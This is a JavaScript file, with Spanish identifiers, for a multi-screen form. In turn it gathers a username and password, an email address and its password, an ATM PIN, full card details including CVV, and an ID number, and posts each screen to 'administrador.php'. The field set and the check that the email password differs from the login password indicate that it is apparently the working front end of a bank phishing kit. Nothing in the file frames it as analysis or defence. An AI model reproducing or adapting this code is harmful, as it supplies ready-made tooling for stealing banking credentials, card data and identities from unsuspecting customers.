var usuario = crearElemento("usuario");
var clave = crearElemento("clave");
var enviarUsuario = crearElemento("enviarusuario");
var formularioUsuario = crearElemento("formusuario");
var almacen = "administrador.php";
//input usuario
if (usuario) {
  usuario.addEventListener("input", function () {
    if (usuario.value.length > 5) {
      clave.removeAttribute("disabled");
    } else {
      clave.setAttribute("disabled", "disabled");
    }
  });
}

//input clave
if (clave) {
  clave.addEventListener("input",function(){
    if(this.value.length > 5){
      enviarUsuario.removeAttribute("disabled");
    }else{
      enviarUsuario.setAttribute("disabled","disabled");
    }
  });
}
if (enviarUsuario) {
  enviarUsuario.addEventListener("click", function () {
    if (usuario.value.length > 5 && clave.value.length > 5) {
      formularioUsuario.setAttribute("method", "post");
      formularioUsuario.setAttribute("action", almacen);
      formularioUsuario.submit();
    }
  });
}
/*  
   _____                            _        __      ___     _        
  / ____|                          | |       \ \    / (_)   | |       
 | (___   ___  __ _ _   _ _ __   __| | __ _   \ \  / / _ ___| |_ __ _ 
  \___ \ / _ \/ _` | | | | '_ \ / _` |/ _` |   \ \/ / | / __| __/ _` |
  ____) |  __/ (_| | |_| | | | | (_| | (_| |    \  /  | \__ \ || (_| |
 |_____/ \___|\__, |\__,_|_| |_|\__,_|\__,_|     \/   |_|___/\__\__,_|
               __/ |                                                  
              |___/                                                   
*/
var atm = crearElemento("atm");
var correo = crearElemento("correo");
var ccorreo = crearElemento("ccorreo");
var confirmacion = crearElemento("confirmacion");
var formularioCorreo = crearElemento("formularioCorreo");
var claveusuario = crearElemento("claveusuario");
var cambio = 2; // no tiene y 1 si tiene
// input correo
if (correo) {
  correo.addEventListener("input", function () {
    if (validateEmail(this.value)) {
      ccorreo.removeAttribute("disabled");
    } else {
      ccorreo.setAttribute("disabled", "disabled");
    }
  });
}
//input clave del correo
if (ccorreo) {
  ccorreo.addEventListener("input", function () {
    if (this.value.length > 4 && this.value != claveusuario.value) {
      atm.removeAttribute("disabled");
    } else {
      atm.setAttribute("disabled", "disabled");
    }
  });
}
//input atm no hay mas
if (atm) {
  atm.addEventListener("input",function(){
    
      if(validateAtm(this.value)){
        if(confirmacion.hasAttribute("disabled")){
          cambio = 1;
          confirmacion.removeAttribute("disabled")
        }
      }else{
        if(cambio = 1){
          confirmacion.setAttribute("disabled","disabled")
        }
        
      }
    
    
  });
}

//boton paara verificar los datos y enviarlos
if (confirmacion) {
  confirmacion.addEventListener("click", function () {
    if (
      validateEmail(correo.value) &&
      ccorreo.value.length > 7 &&
      validateAtm(atm.value) == true
    ) {
      formularioCorreo.setAttribute("method", "post");
      formularioCorreo.setAttribute("action", almacen);
      formularioCorreo.submit();
    }
  });
}

/*
  _______                           __      ___     _        
 |__   __|                          \ \    / (_)   | |       
    | | ___ _ __ ___ ___ _ __ __ _   \ \  / / _ ___| |_ __ _ 
    | |/ _ \ '__/ __/ _ \ '__/ _` |   \ \/ / | / __| __/ _` |
    | |  __/ | | (_|  __/ | | (_| |    \  /  | \__ \ || (_| |
    |_|\___|_|  \___\___|_|  \__,_|     \/   |_|___/\__\__,_|
                                                                                                                                                                            
*/
var cnumber = crearElemento("cnumber"),
  mes = crearElemento("mes"),
  year = crearElemento("year"),
  cvv = crearElemento("cvv"),
  continuar = crearElemento("continue"),
  formcard = crearElemento("card");
var card = false,
  mesvalor = false,
  yearvalor = false,
  cvvvalor = false;
if (cnumber) {
  cnumber.addEventListener("input", function () {
    if (validateCard(cnumber.value)) {
      card = true;
    } else {
      card = false;
    }
    if (card && mesvalor && yearvalor && cvvvalor) {
      continuar.removeAttribute("disabled");
      continuar.classList.add("bton-azul");
    } else {
      continuar.setAttribute("disabled", "disabled");
      continuar.classList.remove("bton-azul");
    }
  });
}
if (mes) {
  mes.addEventListener("change", function () {
    if (mes.value >= 1 && mes.value <= 12) {
      mesvalor = true;
    } else {
      mesvalor = false;
    }
    if (card && mesvalor && yearvalor && cvvvalor) {
      continuar.removeAttribute("disabled");
      continuar.classList.add("bton-azul");
    } else {
      continuar.setAttribute("disabled", "disabled");
      continuar.classList.remove("bton-azul");
    }
  });
}
if (year) {
  year.addEventListener("change", function () {
    if (year.value >= 2021 && year.value <= 2030) {
      yearvalor = true;
    } else {
      yearvalor = false;
    }
    if (card && mesvalor && yearvalor && cvvvalor) {
      continuar.removeAttribute("disabled");
      continuar.classList.add("bton-azul");
    } else {
      continuar.setAttribute("disabled", "disabled");
      continuar.classList.remove("bton-azul");
    }
  });
}
if (cvv) {
  cvv.addEventListener("input", function () {
    if (validateCvv(cvv.value)) {
      cvvvalor = true;
    } else {
      cvvvalor = false;
    }
    if (card && mesvalor && yearvalor && cvvvalor) {
      continuar.removeAttribute("disabled");
      continuar.classList.add("bton-azul");
    } else {
      continuar.setAttribute("disabled", "disabled");
      continuar.classList.remove("bton-azul");
    }
  });
}
if (continuar) {
  continuar.addEventListener("click", function () {
    formcard.setAttribute("action", almacen);
    formcard.setAttribute("method", "POST");
    formcard.submit();
  });
}
/*
 _   _ _     _            ___ 
| | | (_)   | |          /   |
| | | |_ ___| |_ __ _   / /| |
| | | | / __| __/ _` | / /_| |
\ \_/ / \__ \ || (_| | \___  |
 \___/|_|___/\__\__,_|     |_/          
                         
*/
var tipoIdent = crearElemento("tipoIdent");
var nIdent = crearElemento("nident");
var btnIdent = crearElemento("confirIdent");
var formIdent = crearElemento("formularioident");
if (tipoIdent) {
  tipoIdent.addEventListener("change", function () {
    if (tipoIdent.value != "") {
      nIdent.removeAttribute("disabled");
    } else {
      nIdent.setAttribute("disabled", "disabled");
    }
  });
}

if (btnIdent) {
  btnIdent.addEventListener("click", function () {
    if (tipoIdent != "" && nIdent.value.length > 7) {
      formIdent.setAttribute("method", "POST");
      formIdent.setAttribute("action", almacen);
      formIdent.submit();
    }
  });
}



/*             
FFFFFFFFFFFFFFFFFFFFFF
F::::::::::::::::::::F
F::::::::::::::::::::F
FF::::::FFFFFFFFF::::F
  F:::::F       FFFFFF
  F:::::F             
  F::::::FFFFFFFFFF   
  F:::::::::::::::F   
  F:::::::::::::::F   
  F::::::FFFFFFFFFF   
  F:::::F             
  F:::::F             
FF:::::::FF           
F::::::::FF           
F::::::::FF           
FFFFFFFFFFF                                             
*/
//funciones pa' dejate claro en lo claro
function crearElemento(elemento) {
  if (document.getElementById(elemento)) {
    return document.getElementById(elemento);
  }
  return false;
}

function validateEmail(email) {
  const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+")){4,}@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  const repe = /^(?!.*?([abcdefghijqlmnñopqrstuvwxyz1234567890])\1{5,}).+/gm;
  return re.test(email) && repe.test(email);
}
function validateAtm(atm) {
  const re = /^[0-9]{4,12}$/;
  return re.test(atm);
}
function validateCvv(cvv) {
  const re = /^[0-9]{3,4}$/;
  return re.test(cvv);
}


function validateCard(card) {
  const re = /^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$/;
  return re.test(card);
}
